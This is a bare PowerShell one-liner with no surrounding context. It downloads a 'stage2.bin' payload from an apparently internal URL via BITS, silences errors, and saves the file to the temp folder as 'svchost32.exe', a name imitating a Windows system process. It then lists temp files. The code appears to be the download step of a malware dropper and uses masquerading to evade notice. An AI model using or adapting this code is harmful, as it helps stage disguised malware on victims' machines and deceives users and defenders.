
$PayloadUrl = 'https://internal.corp:443/stage2.bin'; $OutputPath = "$env:TEMP\svchost32.exe"; Start-BitsTransfer -Source $PayloadUrl -Destination $OutputPath -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
